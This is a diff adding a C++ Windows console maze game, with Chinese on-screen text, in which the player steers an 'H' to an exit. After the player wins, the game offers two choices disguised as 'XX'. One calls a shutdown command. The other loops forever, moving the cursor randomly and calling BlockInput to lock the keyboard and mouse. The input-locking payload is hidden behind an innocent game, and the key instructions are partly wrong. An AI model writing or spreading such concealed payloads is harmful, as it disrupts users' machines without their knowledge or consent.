@@ -1,0 +1,118 @@
+#include <iostream>
+#include <conio.h>
+#include <windows.h>
+#include <winable.h>
+#include <ctime>
+#include <cstdio>
+#include <stdio.h>
+#include <unistd.h>
+#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)
+using namespace std ;
+int main()
+{
+	int i;
+	cout << "a是往右，s是往下，w是往上，d是往左" << endl ;
+	cout << "按空格键是退出程序" << endl ;
+	Sleep(2000) ;
+	char a[50][50]={"##############################",
+	                "#H         #   ##   # ### ####",
+					"# ###### # # #    # # ### ####",
+					"# #   ## #   # #### # ###   ##",
+					"#   # ##  ###    #  #  ## ####",
+					"##### #     # ##### ##    ####",
+					"#   # ##### #   #   # # #    #",
+					"# # #    ## # #### ## # # ####",  
+					"# # # ##      ##      # # ####",
+					"# # # ####### ## ###### #   ##",
+					"# #   ##   # ## ###### ###   #",
+					"# ###### # #####  #        # #",
+					"#        # #     ######### # *",
+					"# ######## ##### # ### ### # #",
+					"#     # ## ##### ###       ###",
+					"##### # ## #      ######## # #",
+					"#     # ## ## ###        #   #",
+					"# # ###       ###### ####### #",
+					"# #    ### ##      #         #",
+					"##############################"
+				   };
+	int x = 1 , y = 1 , q = 85 ;
+	char p = '#' ;
+	for(i = 0 ; i <= 19 ; i++)
+		puts(a[i]) ;
+	char ch ;
+	while(p != ' ')
+	{
+		ch = getch() ;
+		if(ch == 's')
+		{
+			if (a[x + 1][y] == '*')
+				p = ' ' ;
+			if(a[x + 1][y] != '#')
+			{
+				a[x][y] = ' ' ;
+				x++ ;
+				a[x][y] = 'H' ;
+			}
+		}
+		if(ch == 'w')
+		{
+			if (a[x - 1][y] == '*')
+				p = ' ' ;
+			if(a[x - 1][y] != '#')
+			{
+				a[x][y] = ' ' ;
+				x-- ;
+				a[x][y] = 'H' ;
+			}
+		}
+		if(ch == 'd')
+		{
+			if (a[x][y + 1] == '*')
+				p = ' ' ;
+			if(a[x][y + 1] != '#')
+			{
+				a[x][y] = ' ' ;
+				y++ ;
+				a[x][y] = 'H' ;
+			}
+		}
+		if(ch == 'a')
+		{
+			if (a[x][y - 1] == '*')
+				p = ' ' ;
+			if(a[x][y - 1] != '#')
+			{
+				a[x][y] = ' ' ;
+				y-- ;
+				a[x][y] = 'H' ;
+			}
+		}
+		if(ch == ' ') 
+		{
+			return 0;
+		}
+		system("cls") ;
+		for(i = 0 ; i <= 19 ; i++)
+			puts(a[i]);
+	}
+	system("cls");
+	cout << "QwQ!恭喜通关!你可以有选择两种死法的权利!" << endl ;
+	Sleep(1000) ;
+	cout <<"1.XX       2.XX" << endl ;
+	cout << "请选择：" << endl ;
+	int n ;
+	cin >> n ;
+	if (n == 1)
+		system("shutdown -a 10") ;
+	else
+		if (n == 2)
+		{
+			int x = 1996 , y = 796 ;
+			srand(time(0));
+			while(1){
+				SetCursorPos(rand() % x , rand() % y) ;
+				BlockInput(true);
+			}
+		} 
+	return 0;
+}
